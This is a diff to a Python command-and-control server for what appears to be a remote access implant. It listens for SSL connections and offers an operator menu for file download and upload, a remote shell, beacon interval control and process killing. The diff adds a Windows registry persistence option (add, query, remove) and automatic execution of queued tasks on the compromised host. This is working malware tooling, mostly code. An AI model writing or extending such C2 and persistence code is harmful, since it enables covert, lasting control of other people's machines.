@@ -1,15 +1,17 @@
 #!/usr/bin/python3
-import socket, ssl
+import socket, ssl, persist, beacon
 from socket import AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET, SHUT_RDWR
 from printlib import *
 from os import path, remove, kill, getpid
 from sys import exit
 from signal import SIGTERM
+from tasker import task_list
 
 VERBOSE = True
 
 listen_addr = '0.0.0.0'
 listen_port = 8081
+conn = ""
 ###NEED TO WRITE EACH FILE ON EXECUTE THEN DELETE ON EXIT
 
 def create_keys():
@@ -104,7 +106,7 @@ def send_data(s, plain_text):
     msg = plain_text + "[END]"
     s.send(msg.encode('utf-8'))
     #s.send(encrypt(msg).encode('utf-8')+b"[END]")
-    print_info("Sent:\n"  +plain_text)
+    print_info("Sent:\n" +plain_text)
 
 def file_transfer_get(conn, command):      #get file from server
     send_data(conn, command + "[END]")
@@ -155,11 +157,14 @@ def kill_session(conn, source):
     conn.close()
 
 def listen():
+    global conn
+
     options = """\
     1 - Download a File
     2 - Upload a File
     3 - Kill Process (Do not beacon)
     4 - Drop Connection (start beaconing)
+    5 - Persistence
     shell - Start a Shell
     beacon - Change Beacon Interval"""
 
@@ -186,6 +191,11 @@ def listen():
             print_info("SSL established. Peer: {}".format(conn.getpeercert()))        
             source = "{}:{}".format(fromaddr[0],fromaddr[1])
             cmd = ""
+            if task_list:
+                for task in task_list:
+                    send_data(conn, task)
+                    listen_for_data(conn)
+                conn.close()
             try:
                 while True:
                     prompt = source + "> "
@@ -238,10 +248,19 @@ def listen():
                         kill_session(conn, source)
                         break
                     elif cmd == "4":        #start beaconing
-                        send_data(conn, "[BEACON]START")
-                        kill(getpid(), SIGTERM)
-                    elif cmd == "shell":
-                        while cmd == "shell":
+                        beacon.start_beaconing(conn)
+                    elif cmd == "5":
+                        ans = print_question("Select a Module:\n1 - Add\n2 - Query\n3 - Remove\n")
+                        if ans == "1":
+                            persist.add_reg_persistence(conn)
+                        elif ans == "2":
+                            persist.query_reg_persistence(conn)
+                        elif ans == "3":
+                            persist.delete_reg_persistence(conn)
+                        else:
+                            cmd = ""
+                    elif cmd.lower() == "shell":
+                        while cmd.lower() == "shell":
                             command = input("shell > ")
                             forbidden = ['get ', 'get', 'put ', 'put']
                             for item in forbidden:
@@ -264,10 +283,15 @@ def listen():
                                 print(data.rstrip("[END]"))
                                 data = ""
                     elif cmd.upper() == "BEACON":
-                        seconds = input("(seconds)/? > ")
-                        send_data(conn, "[BEACON]{}".format(seconds))
-                        listen_for_data(conn)
-                        cmd = ""
+                        ans = print_question("Select Option:\n1 - Query\n2 - Configure\n")
+
+                        if ans == "1":
+                            beacon.query(conn)                            
+                        if ans == "2":    
+                            beacon.configure(conn)
+                        else:
+                            cmd = ""
+                        
                     else:
                         cmd = ""
 
